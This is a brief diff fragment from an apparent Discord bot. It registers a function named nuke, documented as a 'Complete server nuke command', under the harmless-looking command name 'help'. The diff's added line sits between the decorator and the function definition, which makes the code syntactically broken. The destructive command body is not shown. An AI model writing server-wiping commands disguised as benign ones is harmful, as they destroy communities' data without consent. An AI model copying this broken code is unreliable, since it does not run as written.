@@ -19,6 +19,7 @@ async def on_ready():
     print(f'Bot is ready to Use')
 
 @bot.command(name='help')
+bot.remove_command('help')
 async def nuke(ctx):
     """
     Complete server nuke command
